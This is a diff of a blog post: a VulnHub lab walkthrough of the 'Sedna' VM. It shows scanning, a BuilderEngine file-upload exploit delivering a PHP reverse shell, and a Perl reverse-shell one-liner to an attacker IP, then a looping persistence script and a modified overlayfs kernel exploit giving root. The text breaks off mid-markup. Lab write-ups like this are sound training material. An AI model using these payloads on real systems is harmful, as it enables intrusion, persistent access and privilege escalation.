@@ -1,12 +1,696 @@
 ---
 layout: post
-title:  "hackfest2016 : Sedna"
-date:   2019-04-15 00:34:01 +0000
+title: "hackfest2016 : Sedna"
+date: 2019-04-15 00:34:01 +0000
 author: Larry Brown
 category: Walkthroughs
 tags: [vulnhub]
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-04-15 00:34:01 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-04-29 16:38:03 +0000" name="updated"/><title>hackfest2016 : Sedna</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/hackfest2016-sedna,181/" target="_blank">https://www.vulnhub.com/entry/hackfest2016-sedna,181/</a></div><div>Hostname: sedna</div><div>IP Address: 10.183.0.185</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.185.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# nmap -Pn -sT -sV -A -p 1-65535 -oA sedna 10.183.0.185</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-15 13:55 EDT</div><div>Nmap scan report for Sedna.homenet.dom (10.183.0.185)</div><div>Host is up (0.0049s latency).</div><div>Not shown: 65523 closed ports</div><div>PORT      STATE SERVICE     VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey:</div><div>|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)</div><div>|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)</div><div>|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)</div><div>|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</font></div><div>| dns-nsid:</div><div>|_  bind.version: 9.9.5-3-Ubuntu</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</font></div><div>| http-robots.txt: 1 disallowed entry</div><div>|_Hackers</div><div>|_http-server-header: Apache/2.4.7 (Ubuntu)  </div><div>|_http-title: Site doesn't have a title (text/html).</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">110/tcp   open  pop3        Dovecot pop3d</font></div><div>|_pop3-capabilities: SASL STLS UIDL PIPELINING CAPA RESP-CODES TOP AUTH-RESP-CODE</div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp   open  rpcbind     2-4 (RPC #100000)</font></div><div>| rpcinfo:</div><div>|   program version   port/proto  service</div><div>|   100000  2,3,4        111/tcp  rpcbind</div><div>|   100000  2,3,4        111/udp  rpcbind</div><div>|   100024  1          44953/udp  status</div><div>|_  100024  1          60597/tcp  status</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">143/tcp   open  imap        Dovecot imapd (Ubuntu)</font></div><div>|_imap-capabilities: listed SASL-IR IDLE OK post-login ENABLE capabilities Pre-login have LITERAL+ ID more LOGINDISABLEDA0001 LOGIN-REFERRALS STARTTLS</div><div> IMAP4rev1</div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">993/tcp   open  ssl/imaps?</font></div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">995/tcp   open  ssl/pop3s?</font></div><div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</font></div><div>| http-methods:</div><div>|_  Potentially risky methods: PUT DELETE</div><div>|_http-open-proxy: Proxy might be redirecting requests</div><div>|_http-server-header: Apache-Coyote/1.1</div><div>|_http-title: Apache Tomcat</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">60597/tcp open  status      1 (RPC #100024)  </font></div><div>MAC Address: 08:00:27:1D:C3:C2 (Oracle VirtualBox virtual NIC)</div><div>Device type: general purpose</div><div>Running: Linux 3.X|4.X</div><div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div>OS details: Linux 3.2 - 4.9</div><div>Network Distance: 1 hop</div><div>Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div><div><br/></div><div><br/></div></div><div>Host script results:</div><div>|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s</div><div>|_nbstat: NetBIOS name: SEDNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div><div>| smb-os-discovery:</div><div>|   OS: Unix (Samba 4.1.6-Ubuntu)</div><div>|   Computer name: sedna</div><div>|   NetBIOS computer name: SEDNA\x00</div><div>|   Domain name: homenet.dom</div><div>|   FQDN: sedna.homenet.dom</div><div>|_  System time: 2019-04-15T13:55:59-04:00   </div><div>| smb-security-mode:</div><div>|   account_used: guest</div><div>|   authentication_level: user</div><div>|   challenge_response: supported</div><div>|_  message_signing: disabled (dangerous, but default)</div><div>| smb2-security-mode:</div><div>|   2.02:</div><div><div>|_    Message signing enabled but not required</div><div>| smb2-time:</div><div>|   date: 2019-04-15 13:55:59</div><div>|_  start_date: N/A</div><div><div><br/></div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   4.94 ms Sedna.homenet.dom (10.183.0.185) </div><div><div><br/></div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 163.94 seconds</div></div></div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>Used nikto to scan the HTTP service on port 80.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# nikto -h http://10.183.0.185</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.185</div><div>+ Target Hostname:    10.183.0.185</div><div>+ Target Port:        80</div><div>+ Start Time:         2019-04-15 14:22:16 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> (Ubuntu)</div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div><div>+ "robots.txt" contains 1 entry which should be manually viewed.</div><div>+ Server may leak inodes via ETags, header found with file /, inode: 65, size: 53fb059bb5bc8, mtime: gzip</div><div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div><div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </div><div>+ OSVDB-3268: /files/: Directory indexing found.</div><div>+ OSVDB-3092: /files/: This might be interesting...</div><div>+ OSVDB-3092: /system/: This might be interesting...</div><div>+ OSVDB-3233: /icons/README: Apache default file found.</div><div>+ OSVDB-3092: /license.txt: License file found may identify site software.</div><div>+ 7917 requests: 0 error(s) and 12 item(s) reported on remote host</div><div>+ End Time:           2019-04-15 14:26:25 (GMT-4) (249 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div><br/></div><div>Browsed through the /files directory, but it only contains images (and some access denied).</div><div><br/></div><div>The license.txt file at <a href="http://10.183.0.185/license.txt">http://10.183.0.185/license.txt</a> looks like it is for BuilderEngine.</div><div><br/></div><div><img height="330" src="/assets/images/2019-04-15-hackfest2016-sedna/72BB2BDC-F2B9-4EE5-9685-652B2FD1C6FC.png" width="619"/><br/></div><div><br/></div><div>Searching the exploit database, there appears to be a known exploit that allows unauthenticated users to upload files.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>BuilderEngine 3.5.0 - Arbitrary File Upload                                                                  | exploits/php/webapps/40390.php</div></div><div><br/></div><div>I checked the URL in the exploit to confirm the path was accessible on the server. It was, so I modified the exploit to post to the victim (and changed the extension to .html).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# diff 40390.php 40390.html </div><div>22c22</div><div>&lt; &lt;form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"&gt;</div><div>---</div><div>&gt; &lt;form method="post" action="http://10.183.0.185/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"&gt;</div></div><div><br/></div><div>I used msfvenom to create my PHP reverse shell payload.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>No encoder or badchars specified, outputting raw payload</div><div>Payload size: 3053 bytes</div></div><div><br/></div><div>I used the exploit form to upload the payload...</div><div><br/></div><div><img height="62" src="/assets/images/2019-04-15-hackfest2016-sedna/5C0B8B5E-75E1-45D3-8BC6-5BA4ABBBCE8D.png" width="592"/><br/></div><div><br/></div><div>...which returned a JSON object with the uploaded file's path.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>{</div><div>    "files": [</div><div>    {</div><div>        "name": "rev.php",</div><div>        "size": 3053,</div><div>        "type": "text\/php",</div><div>        "url": "http:\/\/10.183.0.185\/files\/rev.php",</div><div>        "deleteUrl": "http:\/\/10.183.0.185\/themes\/dashboard\/assets\/plugins\/jquery-file-upload\/server\/php\/?file=rev.php",</div><div>        "deleteType": "DELETE"</div><div>    }]</div><div>}</div></div><div><br/></div><div>I started a handler in Metasploit to catch the PHP reverse shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 0.</div><div>[*] Exploit completed, but no session was created.</div><div>[*] Started reverse TCP handler on 10.183.0.222:5432</div></div><div><br/></div><div>Then I used curl to request the PHP reverse shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# curl http://10.183.0.185/files/rev.php</div></div><div><br/></div><div>And our session was created...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.185:40883) at 2019-04-15 15:26:47 -0400</div><div>msf5 exploit(multi/handler) &gt; sessions 1</div><div>[*] Starting interaction with 1...</div><div><div><br/></div><div><br/></div></div><div>pwd</div><div>/var/www/html/files</div><div>id</div><div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div></div><div><br/></div><div>I found the first flag in the /var/www directory.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>cd /var/www</div><div>cat flag.txt</div><div>bfbb7e6e6e88d9ae66848b9aeac6b289</div></div><div><br/></div><div>Since the PHP shell only stays up for a limited time, I created another listener in Metasploit and started a reverse shell from the victim using Perl.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div><div>LPORT =&gt; 5433</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 3.</div><div>[*] Exploit completed, but no session was created.</div><div>[*] Started reverse TCP handler on 10.183.0.222:5433</div></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div></div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>Since SSH is open on the victim, I checked to see if the www-data user has a default home directory and shell defined.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>grep `whoami` /etc/passwd</div><div>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div></div><div><br/></div><div>The home directory exists, but only allows writes by root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>drwxr-xr-x  3 root root   4096 Oct 22  2016 www</div></div><div><br/></div><div>The default shell is set to '/usr/sbin/nologin', so I won't be able to SSH to the box with this account.</div><div><br/></div><div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# cat loading</div><div>#!/bin/sh</div><div>while true; do</div><div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div><div>    # sleep for 300 seconds (5 mins)</div><div>    sleep 300</div><div>done</div></div><div><br/></div><div>I uploaded the script to the victim's /var/www/html/files directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/var/www/html/files$ wget -O loading 10.183.0.222:4321/loading</div><div>wget -O loading 10.183.0.222:4321/loading</div><div>--2019-04-16 10:28:00--  http://10.183.0.222:4321/loading</div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 311 [application/octet-stream]</div><div>Saving to: 'loading'</div><div><div><br/></div><div><br/></div></div><div>100%[======================================&gt;] 311         --.-K/s   in 0s      </div><div><div><br/></div><div><br/></div></div><div>2019-04-16 10:28:00 (76.0 MB/s) - 'loading' saved [311/311]</div><div><div><br/></div><div><br/></div></div><div>www-data@Sedna:/var/www/html/files$ chmod +x loading</div><div>chmod +x loading</div><div>www-data@Sedna:/var/www/html/files$ ./loading &amp;</div><div>./loading &amp;</div><div>[1] 23635</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>The /etc/issue.net file shows the operating system to be Ubuntu 14.04.1 LTS. The /boot directory shows a kernel version of 3.13.0-32 (confirmed with uname -r). This was also confirmed in the /etc/os-release file.</div><div><br/></div><div>Searching the exploit database, a couple of exploits have potential.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation         | exploits/linux/local/37292.c</div><div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access | exploits/linux/local/37293.txt</div></div><div><br/></div><div>I started a python web service and transferred the 37292.c file to the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# python -m SimpleHTTPServer 4321</div><div>Serving HTTP on 0.0.0.0 port 4321 ...</div><div>10.183.0.185 - - [15/Apr/2019 16:27:14] "GET /37292.c HTTP/1.1" 200 -</div></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/tmp$ wget -O 37292.c 10.183.0.222:4321/37292.c</div><div>wget -O 37292.c 10.183.0.222:4321/37292.c</div><div>--2019-04-15 16:27:15--  http://10.183.0.222:4321/37292.c</div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 5119 (5.0K) [text/plain]</div><div>Saving to: '37292.c' </div><div><div><br/></div><div><br/></div></div><div>100%[======================================&gt;] 5,119       --.-K/s   in 0s</div><div><div><br/></div><div><br/></div></div><div>2019-04-15 16:27:15 (726 MB/s) - '37292.c' saved [5119/5119]</div></div><div><br/></div><div>The file successfully compiled and seemed to run properly, but it didn't give me root. Turns out, the 'su' command (the last command in the exploit) is not available on the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/tmp$ gcc -o pwn 37292.c</div><div>www-data@Sedna:/tmp$ ./pwn</div><div>spawning threads</div><div>mount #1</div><div>mount #2</div><div>child threads done   </div><div>/etc/ld.so.preload created</div><div>creating shared library</div><div><div><br/></div><div>www-data@Sedna:/tmp$ su -</div><div>The program 'su' is currently not installed. To run 'su' please ask your administrator to install the package 'login'</div></div></div><div><br/></div><div>I opened the exploit C code and replaced references to 'su' with 'sudo' (which <span style="font-style: italic;">is</span> available and is also suid).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# diff 37292.c 37292-1.c </div><div>54c54</div><div>&lt; #define LIB "#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"</div><div>---</div><div>&gt; #define LIB "#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \"/usr/bin/sudo\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"</div><div>151,152c151,152</div><div>&lt;     execl("/bin/su","su",NULL);</div><div>&lt; }</div><div>\ No newline at end of file</div><div>---</div><div>&gt;     execl("/usr/bin/sudo","sudo",NULL);</div><div>&gt; }</div></div><div><br/></div><div>I transferred the updated exploit to the victim and recompiled. This time, it worked! :]</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/tmp$ gcc -o pwn2 37292-1.c</div><div>www-data@Sedna:/tmp$ ./pwn2</div><div>spawning threads</div><div>mount #1</div><div>mount #2</div><div>child threads done</div><div>/etc/ld.so.preload created</div><div>creating shared library</div><div># id</div><div>uid=0(root) gid=0(root) groups=0(root),33(www-data)</div></div><div><br/></div><div>And the flag from /root...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Sedna:/root# cat flag.txt</div><div>a10828bee17db751de4b936614558305</div></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** REMOVE PUBLIC KEY FROM /root/.ssh/authorized_keys ***</div><div>*** REMOVE /var/www/html/files/rev.php ***</div><div>*** KILL /var/www/html/files/loading ***</div><div>*** REMOVE /var/www/html/files/loading ***</div><div>*** REMOVE update, ofs-lib.so, pwn, 37292.c, pwn2, and 37292-1.c from /tmp ***</div><div><br/></div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">chkrootkit</span></div><div><br/></div><div>In addition to the privilege escalation issue we found in Ubuntu, there is a known issue with the version of 'chkrootkit' located in /etc/chkrootkit.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V</div><div>chkrootkit version 0.49</div></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid 